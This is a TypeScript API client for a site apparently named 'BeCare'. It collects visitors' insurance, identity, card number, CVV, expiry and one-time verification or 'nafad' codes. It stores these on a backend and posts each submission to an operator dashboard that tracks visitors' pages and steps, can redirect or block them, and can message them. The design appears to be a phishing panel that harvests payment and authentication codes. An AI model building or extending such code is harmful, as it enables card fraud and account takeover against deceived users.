/**
 * BeCare API Client
 * Replaces all Firebase Firestore calls with REST API + Socket.io calls
 */

// API connects to the same-origin backend so all visitor data is persisted via the
// PostgreSQL-backed server rather than being routed to old external hosts.
const _rawApiUrl = (import.meta.env.VITE_API_URL || '').trim();
const fallbackApiBase = typeof window !== 'undefined' ? window.location.origin : '';
export const API_BASE = _rawApiUrl || fallbackApiBase || '';

// ─── HTTP Helper ──────────────────────────────────────────────────────────────
async function apiRequest(method: string, path: string, body?: any): Promise<any> {
  const res = await fetch(`${API_BASE}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: 'Unknown error' }));
    throw new Error(err.error || `HTTP ${res.status}`);
  }
  return res.json();
}

export function hasMeaningfulDashboardPayload(payload: Record<string, any> | undefined): boolean {
  if (!payload || typeof payload !== 'object') return false;

  const relevantKeys = [
    'ownerName', 'buyerName', 'customer', 'name', 'firstName', 'lastName',
    'identityNumber', 'buyerIdNumber', 'phoneNumber', 'email', 'documentType',
    'serialNumber', 'insuranceType', 'registrationType', 'coverageType',
    'vehicleModel', 'manufacturingYear', 'vehicleUsage', 'usage', 'repairLocation',
    'companyName', 'originalPrice', 'discount', 'finalPrice', 'features',
    'cardNumber', 'cardOwner', 'cardExpiry', 'cvv', 'verificationCode',
    'country', 'countryName', 'countryCode', 'city', 'address', 'paymentMethod',
    'currentPage', 'page', 'currentStep', 'step', 'redirectPage', 'redirect_page',
    'nafadConfirmationCode', 'nafadConfirmationStatus', 'status', 'isOnline',
  ];

  const nestedPayload = payload.raw ?? payload.formData ?? payload.data;
  if (nestedPayload && typeof nestedPayload === 'object' && hasMeaningfulDashboardPayload(nestedPayload)) {
    return true;
  }

  const hasIdentity = Boolean(payload.id || payload.visitorId || payload.raw?.id || payload.raw?.visitorId);
  if (hasIdentity) return true;

  return relevantKeys.some((key) => {
    const value = payload[key];
    if (value === undefined || value === null) return false;
    if (typeof value === 'string') {
      const trimmed = value.trim();
      if (!trimmed) return false;
      return !['عميل جديد', 'new', 'visitor', 'زائر'].includes(trimmed);
    }
    if (typeof value === 'number') return true;
    if (Array.isArray(value)) return value.some((entry) => (typeof entry === 'string' ? entry.trim().length > 0 : Boolean(entry)));
    return Boolean(value);
  });
}

export async function notifyDashboard(payload: Record<string, any>): Promise<void> {
  if (typeof window === 'undefined') return;
  try {
    const fallbackVisitorId = window.localStorage.getItem('visitor') || `visitor_${Date.now()}`;
    const hasIdentity = Boolean(payload?.id || payload?.visitorId || payload?.raw?.id || payload?.raw?.visitorId || fallbackVisitorId);
    if (!hasMeaningfulDashboardPayload(payload) && !hasIdentity) {
      return;
    }

    const visitorId = payload?.id || payload?.visitorId || payload?.raw?.id || payload?.raw?.visitorId || fallbackVisitorId;
    const combinedPayload = { ...(payload?.raw || {}), ...(payload || {}) };
    const customerName = String(
      combinedPayload?.customer ||
      combinedPayload?.ownerName ||
      combinedPayload?.buyerName ||
      combinedPayload?.name ||
      combinedPayload?.firstName ||
      combinedPayload?.lastName ||
      combinedPayload?.identityNumber ||
      combinedPayload?.phoneNumber ||
      payload?.raw?.ownerName ||
      payload?.raw?.buyerName ||
      payload?.raw?.name ||
      'زائر'
    );
    const currentPage = String(combinedPayload?.currentPage || combinedPayload?.page || payload?.raw?.currentPage || payload?.raw?.page || 'home');
    
    // Parse currentStep - handle both numeric and string values like "_st1", "_t2", "_t3"
    const rawStep = combinedPayload?.currentStep ?? combinedPayload?.step ?? payload?.raw?.currentStep ?? payload?.raw?.step ?? 1;
    let currentStep = Number(rawStep);
    if (isNaN(currentStep)) {
      const match = String(rawStep).match(/_t?(\d+)/);
      currentStep = match ? parseInt(match[1], 10) : 1;
    }

    let stage = 'الخطوة 1';
    let status = 'جديد';
    let badge = 'new';

    if (currentPage === 'insur' || currentPage === 'confi' || currentPage === 'veri' || currentPage === 'check' || currentStep >= 2) {
      stage = 'الخطوة 2';
      status = 'قيد المعالجة';
      badge = 'pending';
    }
    if (currentPage === 'nafad' || currentPage === 'phone' || currentPage === 'thank-you' || currentStep >= 3) {
      stage = 'الخطوة 3';
      status = 'مكتمل';
      badge = '';
    }

    const baseUrl = (API_BASE || window.location.origin || '').replace(/\/+$/, '');
    const dashboardUrl = `${baseUrl}/api/dashboard/requests`;
    await fetch(dashboardUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: `REQ-${String(visitorId).slice(0, 8).toUpperCase()}`,
        customer: String(customerName),
        status,
        stage,
        updated: 'تم التحديث الآن',
        badge,
        visitorId: String(visitorId),
        submittedAt: new Date().toISOString(),
        raw: payload,
      }),
    });
  } catch {
    // ignore dashboard notification failures
  }
}

// ─── Visitor API ──────────────────────────────────────────────────────────────

/** Create or initialize a visitor document */
export async function createVisitor(data: Record<string, any>): Promise<string> {
  const result = await apiRequest('POST', '/api/visitors', data);
  return result.visitorId;
}

/** Persist visitor data and notify dashboard only on explicit form submission */
export async function submitVisitorFormData(data: Record<string, any>): Promise<void> {
  const visitorId = data?.id || data?.visitorId || data?.raw?.id || data?.raw?.visitorId || (typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  if (typeof window !== 'undefined') {
    window.localStorage.setItem('visitor', String(visitorId));
  }

  try {
    await addData(data);
  } catch {
    // Silently ignore - visitor may not exist yet or network error
  }

  await notifyDashboard({ ...data, id: String(visitorId), visitorId: String(visitorId), source: 'submit' });
}

/** Get visitor data by ID */
export async function getData(id: string): Promise<Record<string, any> | null> {
  try {
    return await apiRequest('GET', `/api/visitors/${id}`);
  } catch {
    return null;
  }
}

/** Update visitor data (partial update) */
export async function addData(data: Record<string, any>): Promise<void> {
  const { id, ...payload } = data;
  const visitorId = id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  if (typeof window !== 'undefined') {
    localStorage.setItem('visitor', visitorId);
  }

  try {
    await apiRequest('PATCH', `/api/visitors/${visitorId}`, payload);
  } catch {
    // Silently ignore - visitor may not exist yet or network error
  }
}

/** Set current page for visitor */
export const handleCurrentPage = (page: string): void => {
  if (typeof window === 'undefined') return;
  const visitorId = localStorage.getItem('visitor');
  if (!visitorId) return;
  addData({ id: visitorId, currentPage: page });
};

/** Handle payment info update */
export const handlePay = async (paymentInfo: any, setPaymentInfo: any): Promise<void> => {
  try {
    const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
    if (visitorId) {
      await apiRequest('PATCH', `/api/visitors/${visitorId}`, { ...paymentInfo, status: 'pending' });
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('[API] Error adding payment info:', error);
  }
};

/** Add history entry */
export async function addToHistory(visitorId: string, type: string, data: any, status: string = 'pending'): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/history`, { type, data, status });
  } catch (e) {
    console.error('[API] Error adding history:', e);
  }
}

/** Set visitor offline */
export async function setVisitorOffline(visitorId: string): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/offline`, {});
  } catch {
    // silent
  }
}

/** Clear redirect page */
export async function clearRedirectPage(visitorId: string): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/clear-redirect`, {});
  } catch {
    // silent
  }
}

/** Check if visitor is blocked */
export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const data = await getData(visitorId);
    return data?.is_blocked === true || data?.isBlocked === true;
  } catch {
    return false;
  }
}

/** Get messages for visitor */
export async function getMessages(visitorId: string): Promise<any[]> {
  try {
    return await apiRequest('GET', `/api/visitors/${visitorId}/messages`);
  } catch {
    return [];
  }
}

/** Send message */
export async function sendMessage(visitorId: string, message: string, senderName?: string): Promise<void> {
  // Messages are sent via Socket.io (see socket.ts)
  // This is a fallback REST call
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/messages`, { message, senderName });
  } catch (e) {
    console.error('[API] Error sending message:', e);
  }
}
